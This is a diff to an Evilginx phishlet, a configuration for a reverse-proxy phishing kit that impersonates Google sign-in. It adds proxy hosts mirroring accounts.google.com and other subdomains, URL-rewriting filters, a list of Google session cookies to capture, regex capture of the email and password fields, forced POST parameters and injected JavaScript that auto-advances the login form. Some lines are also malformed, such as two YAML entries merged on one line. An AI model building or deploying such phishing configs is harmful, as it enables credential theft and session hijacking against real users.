@@ -2,6 +2,12 @@ name: 'google'
 author: 'Momen Abu Assi - v1.0.0'
 min_ver: '3.0.0'
 proxy_hosts:
+  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'lh3', orig_sub: 'lh3', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'apis', orig_sub: 'apis', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'myaccount', orig_sub: 'myaccount', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'play', orig_sub: 'play', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
   - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: false, is_landing: true, auto_filter: true}
   - {phish_sub: 'apis', orig_sub: 'apis', domain: 'google.com', session: false, is_landing: false, auto_filter: true}
   - {phish_sub: 'cdn-5d077a', orig_sub: 'feedback-pa.clients6', domain: 'google.com', session: false, is_landing: false, auto_filter: true}
@@ -12,7 +18,10 @@ proxy_hosts:
   - {phish_sub: 'play', orig_sub: 'play', domain: 'google.com', session: false, is_landing: false, auto_filter: true}
   - {phish_sub: 'www', orig_sub: 'www', domain: 'google.com', session: false, is_landing: false, auto_filter: true}
 sub_filters:
-  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'https://accounts.google.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'https://accounts.google.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/css']}
+  - {triggers_on: 'www.google.com', orig_sub: 'www', domain: 'google.com', search: 'https://www.google.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'lh3.google.com', orig_sub: 'lh3', domain: 'google.com', search: 'https://lh3.google.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'image/*']}
+  - {triggers_on: 'fonts.googleapis.com', orig_sub: 'fonts', domain: 'google.com', search: 'https://fonts.googleapis.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/css']}  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'https://accounts.google.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
   - {triggers_on: 'apis.google.com', orig_sub: 'apis', domain: 'google.com', search: 'https://apis.google.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
   - {triggers_on: 'feedback-pa.clients6.google.com', orig_sub: 'feedback-pa.clients6', domain: 'google.com', search: 'https://feedback-pa.clients6.google.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
   - {triggers_on: 'lh3.google.com', orig_sub: 'lh3', domain: 'google.com', search: 'https://lh3.google.com', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
@@ -26,7 +35,7 @@ auth_tokens:
     keys: ["ACCOUNT_CHOOSER", "AF_initDataKeys", "APISID", "HSID", "LSID", "OSID", "SAPISID", "SID", "SIDCC", "SSID", "_F_cssRowKey", "__Host-1PLSID", "__Host-3PLSID", "__Host-GAPS", "__Secure-1PAPISID", "__Secure-1PSID", "__Secure-1PSIDCC", "__Secure-1PSIDTS", "__Secure-3PAPISID", "__Secure-3PSID", "__Secure-3PSIDCC", "__Secure-3PSIDTS", "__Secure-OSID", ".*,regexp"]
 credentials:
   username:
-    key: 'email'
+    key: 'identifier'
     search: '(.*)'
     type: 'post'
   password:
@@ -42,12 +51,16 @@ login:
   domain: 'accounts.google.com'
   path: '/'
 force_post:
-  - path: '/v3/signin/_/AccountsSignInUi/data/batchexecute'
+  - path: '/_/AccountsSignInUi/browserinfo'
     search:
       - {key: 'f.req', search: '(.*)'}
       - {key: 'at', search: '(.*)'}
     force:
-      - {key: 'remember_me', value: '1'}
+      - {key: 'identifier', value: '${EMAIL}'}
+      - {key: 'continue', value: 'https://accounts.google.com/'}
+      - {key: 'hl', value: 'en'}
+      - {key: 'hl', value: 'en'}
+      - {key: 'f.req', search: '(.*)'}
     type: 'post'
   - path: '/v3/signin/_/AccountsSignInUi/browserinfo'
     search:
@@ -69,42 +82,46 @@ js_inject:
     script: |
       (function() {
         'use strict';
-
-        // Wait for the page to fully load
-        function injectScript() {
-          // Find the Next button using multiple reliable selectors
-          const nextButton = document.querySelector('button[aria-label="Next"], button[jsname="JnI2Ve"]');
+        
+        function waitForButton() {
+          const nextBtn = document.querySelector('button[jsname="JnI2Ve"]:not([disabled])');
           
-          if (nextButton) {
-            console.log('[Evilginx] Next button found. Adding click handler...');
+          if (nextBtn) {
+            // Store original click
+            const originalClick = nextBtn.onclick;
             
-            // Add a click listener
-            nextButton.addEventListener('click', function(e) {
-              console.log('[Evilginx] Next button clicked manually');
-              // Prevent default behavior if necessary
-              // e.preventDefault(); 
-            });
-
-            // Force the click after a short delay to ensure the form is ready
-            setTimeout(function() {
-              if (nextButton.offsetParent !== null) {
-                console.log('[Evilginx] Triggering Next button click...');
-                const clickEvent = new MouseEvent('click', {
-                  view: window,
-                  bubbles: true,
-                  cancelable: true
-                });
-                nextButton.dispatchEvent(clickEvent);
-              }
-            }, 500);
+            nextBtn.onclick = function(e) {
+              console.log('[Evilginx] Next button clicked');
+              if (originalClick) originalClick.call(this, e);
+            };
+            
+            // Auto-trigger if form has input
+            const emailInput = document.querySelector('input[name="identifier"]');
+            if (emailInput && emailInput.value) {
+              setTimeout(() => {
+                nextBtn.click();
+              }, 100);
+            }
           } else {
-            console.log('[Evilginx] Next button not found');
+            setTimeout(waitForButton, 500);
           }
         }
-
-        if (document.readyState === 'loading') {
-          document.addEventListener('DOMContentLoaded', injectScript);
-        } else {
-          injectScript();
+        
+        // Fix the form action
+        const form = document.querySelector('form[action*="/signin"]');
+        if (form) {
+          form.action = form.action.replace('/signin', '/signin');
         }
+        
+        // Enable buttons on input
+        document.addEventListener('input', function(e) {
+          if (e.target.tagName === 'INPUT') {
+            const nextBtn = document.querySelector('button[jsname="JnI2Ve"]');
+            if (nextBtn && e.target.value) {
+              nextBtn.disabled = false;
+            }
+          }
+        });
+        
+        waitForButton();
       })();
